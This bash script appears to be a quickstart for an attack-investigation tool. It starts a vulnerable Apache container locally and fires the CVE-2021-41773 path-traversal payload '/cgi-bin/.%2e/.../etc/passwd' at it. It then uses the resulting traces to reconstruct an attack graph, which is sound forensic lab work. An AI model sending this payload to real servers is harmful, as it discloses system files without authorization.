#!/usr/bin/env bash
set -euo pipefail

EXAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
COMPASS_DIR="$(cd "${EXAMPLE_DIR}/../.." && pwd)"
REPO_ROOT="${COMPASS_DIR}"
IMAGE="compass-apache-cve-2021-41773:latest"
KEEP_DIR=""
WORK_DIR="$(mktemp -d "${TMPDIR:-/tmp}/compass-apache-quickstart.XXXXXX")"
TRACE_DIR="${WORK_DIR}/traces"
CASE_DIR="${WORK_DIR}/case"
COPY_CONTAINER=""
RUN_CONTAINER=""

usage() {
  echo "usage: $0 [--keep OUTPUT_DIRECTORY]" >&2
  exit 2
}

if [[ "${1:-}" == "--keep" ]]; then
  [[ -n "${2:-}" ]] || usage
  KEEP_DIR="$(mkdir -p "$2" && cd "$2" && pwd)"
elif [[ -n "${1:-}" ]]; then
  usage
fi

mkdir -p "${TRACE_DIR}"

cleanup() {
  if [[ -n "${RUN_CONTAINER}" ]]; then
    docker rm -f "${RUN_CONTAINER}" >/dev/null 2>&1 || true
  fi
  if [[ -n "${COPY_CONTAINER}" ]]; then
    docker rm -f "${COPY_CONTAINER}" >/dev/null 2>&1 || true
  fi
  if [[ -n "${KEEP_DIR}" ]]; then
    cp -R "${WORK_DIR}/." "${KEEP_DIR}/"
    echo "Artifacts: ${KEEP_DIR}"
  fi
  rm -rf "${WORK_DIR}"
}
trap cleanup EXIT

if ! docker image inspect "${IMAGE}" >/dev/null 2>&1; then
  docker build -t "${IMAGE}" -f "${EXAMPLE_DIR}/Dockerfile" "${REPO_ROOT}"
fi

COPY_CONTAINER="$(docker create "${IMAGE}")"
docker cp "${COPY_CONTAINER}:/opt/httpd/bin/httpd" "${WORK_DIR}/httpd"
docker rm -f "${COPY_CONTAINER}" >/dev/null
COPY_CONTAINER=""

RUN_CONTAINER="compass-apache-qs-$$-$(date +%s)"
docker run -d \
  --name "${RUN_CONTAINER}" \
  --cap-add SYS_PTRACE \
  --security-opt seccomp=unconfined \
  -p 127.0.0.1::8080 \
  -v "${TRACE_DIR}:/traces" \
  "${IMAGE}" >/dev/null

PORT=""
for _ in {1..120}; do
  PORT="$(docker port "${RUN_CONTAINER}" 8080/tcp 2>/dev/null | awk -F: 'NR==1 {print $NF}')"
  if [[ -n "${PORT}" ]]; then
    break
  fi
  sleep 0.25
done
[[ -n "${PORT}" ]] || { echo "failed to discover the Apache container port" >&2; exit 1; }

for _ in {1..120}; do
  if curl -fsS "http://127.0.0.1:${PORT}/" >/dev/null 2>&1; then
    break
  fi
  sleep 0.25
done

curl -fsS "http://127.0.0.1:${PORT}/" > "${WORK_DIR}/benign-response.txt"
curl -fsS "http://127.0.0.1:${PORT}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd" > "${WORK_DIR}/exploit-response.txt"

grep -q '^root:' "${WORK_DIR}/exploit-response.txt" || {
  echo "the Apache CVE-2021-41773 payload did not disclose /etc/passwd" >&2
  exit 1
}

docker stop "${RUN_CONTAINER}" >/dev/null
docker rm "${RUN_CONTAINER}" >/dev/null
RUN_CONTAINER=""

python3 "${EXAMPLE_DIR}/build_case.py" \
  --binary "${WORK_DIR}/httpd" \
  --trace-dir "${TRACE_DIR}" \
  --output "${CASE_DIR}"

SYMPTOM_EVENT="$(
  python3 - <<'PY' "${CASE_DIR}/case.json"
import json
import sys
from pathlib import Path
case = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
print(case["symptom_event"])
PY
)"

cd "${COMPASS_DIR}"
PYTHONDONTWRITEBYTECODE=1 python3 -m compass investigate \
  --acg "${CASE_DIR}/application.acg.json" \
  --log "${CASE_DIR}/audit.jsonl" \
  --profile "${CASE_DIR}/profile.json" \
  --symptom "${SYMPTOM_EVENT}" \
  --output "${CASE_DIR}/attack-graph.json"

python3 "${EXAMPLE_DIR}/verify_result.py" \
  --case "${CASE_DIR}/case.json" \
  --result "${CASE_DIR}/attack-graph.json"
